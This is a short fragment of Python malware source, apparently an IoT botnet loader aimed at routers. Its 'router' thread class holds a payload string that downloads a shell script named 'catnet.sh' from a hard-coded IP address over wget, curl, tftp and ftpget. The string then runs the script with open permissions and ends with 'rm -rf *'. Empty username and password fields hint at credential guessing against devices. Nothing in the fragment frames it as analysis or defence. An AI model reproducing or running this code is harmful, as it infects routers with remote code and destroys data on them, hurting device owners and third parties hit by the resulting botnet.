...
class router(threading.Thread):
    def __init__ (self, ip):
        ...
        self.rekdevice="vcd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://2.56.212.215/catnet.sh; curl -O http://2.56.212.215/catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp 2.56.212.215 -c get catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp -r catnet2.sh -g 2.56.212.215; chmod 777 catnet2.sh; sh catnet2.sh; ftpget -v -u anonymous -p anonymous -P 21 2.56.212.215 catnet1.sh catnet1.sh; sh catnet1.sh; rm -rf catnet.sh catnet.sh catnet2.sh catnet1.sh; rm -rf *" #<---Payload Goes In Between The ---> "" 
    def run(self):
        global fh
        username = ""
        password = ""
